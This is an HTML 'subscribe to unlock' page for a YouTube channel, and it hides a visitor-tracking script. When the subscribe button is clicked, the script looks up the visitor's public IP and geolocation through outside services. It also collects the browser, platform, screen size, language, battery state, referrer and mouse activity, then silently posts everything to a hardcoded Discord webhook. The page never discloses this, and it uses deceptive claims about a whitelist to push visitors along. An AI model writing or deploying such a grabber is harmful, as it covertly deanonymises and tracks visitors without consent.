<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Access</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
    }
    button {
      background-color: #444;
      border: none;
      color: white;
      padding: 12px 24px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 8px;
      margin-top: 20px;
      transition: 0.3s;
    }
    button:hover {
      background-color: #666;
    }
    #noteContainer, #continueContainer, #hotelContainer {
      display: none;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <h1>Welcome User</h1>
  <button id="subscribeBtn">Subscribe to @TheMugenKing</button>

  <div id="noteContainer">
    <p><strong>Note:</strong> Please wait <span id="timer">10</span> seconds after subscribing.</p>
    <div id="continueContainer">
      <button id="continueBtn" disabled>Continue</button>
    </div>
  </div>

  <div id="hotelContainer">
    <p>Welcome</p>
    <p>You Have Subscribed - Our Channel<p>
    <p>It Will Automatically Open Soon <p>
    <p>If You Unsubscribe, We Will Delete Your Whitelist User<p>
    <p>Now type 'Subscribe' in the box below to unlock<p>
  </div>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1381911749338464256/RzD7NHxjZy2IKqWG5xd4Jrtr2XloUjSLwDywAAypuwC8lXggNYhmNFXQ6a-uyzR_qUBp'; // REPLACE THIS

    let mouseMoves = [];
    let sessionID = crypto.randomUUID();
    let accessTime = new Date().toISOString();
    let startTime = Date.now();

    // Track mouse movement
    document.addEventListener('mousemove', (e) => {
      mouseMoves.push({ x: e.clientX, y: e.clientY, t: Date.now() });
    });

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: battery.level,
          charging: battery.charging
        };
      } catch {
        return { level: null, charging: null };
      }
    }

    async function collectAndSendData() {
      const battery = await getBatteryInfo();
      const resolution = `${screen.width}x${screen.height}`;
      const language = navigator.language;
      const platform = navigator.platform;
      const userAgent = navigator.userAgent;
      const referrer = document.referrer;
      const duration = ((Date.now() - startTime) / 1000).toFixed(2);

      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();

      const geoRes = await fetch(`https://ipapi.co/json`);
      const geo = await geoRes.json();

      const data = {
        content: `ðŸ“¥ New Subscriber Access Attempt`,
        embeds: [{
          title: 'User Info',
          color: 0x0099ff,
          fields: [
            { name: 'IP', value: ipData.ip, inline: true },
            { name: 'Location', value: `${geo.city}, ${geo.region}, ${geo.country_name}`, inline: true },
            { name: 'Browser', value: userAgent },
            { name: 'Platform', value: platform, inline: true },
            { name: 'Device', value: /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop', inline: true },
            { name: 'Referrer', value: referrer || 'Direct' },
            { name: 'Resolution', value: resolution, inline: true },
            { name: 'Language', value: language, inline: true },
            { name: 'Battery', value: `ðŸ”‹ ${battery.level * 100}% | ${battery.charging ? "Charging" : "Not Charging"}`, inline: true },
            { name: 'Session ID', value: sessionID },
            { name: 'Access Time', value: accessTime },
            { name: 'Duration', value: `${duration} seconds`, inline: false },
            { name: 'Mouse Movements', value: `${mouseMoves.length}` }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    }

    // Subscribe button
    const subscribeBtn = document.getElementById('subscribeBtn');
    const noteContainer = document.getElementById('noteContainer');
    const timerSpan = document.getElementById('timer');
    const continueBtn = document.getElementById('continueBtn');
    const hotelContainer = document.getElementById('hotelContainer');

    subscribeBtn.addEventListener('click', () => {
      window.open('https://youtube.com/@themugenking?si=xHcLhvJnGXWcE_ZG', '_blank');

      subscribeBtn.disabled = true;
      noteContainer.style.display = 'block';

      collectAndSendData();

      let timeLeft = 10;
      const countdown = setInterval(() => {
        timerSpan.textContent = timeLeft;
        timeLeft--;
        if (timeLeft < 0) {
          clearInterval(countdown);
          continueBtn.disabled = false;
          document.getElementById('continueContainer').style.display = 'block';
          timerSpan.textContent = 'Ready';
        }
      }, 1000);
    });

    continueBtn.addEventListener('click', () => {
      hotelContainer.style.display = 'block';
      setTimeout(() => {
        window.location.href = 'https://example.com/premium-content'; // Ganti dengan konten premium
      }, 3000);
    });
  </script>

</body>
</html>
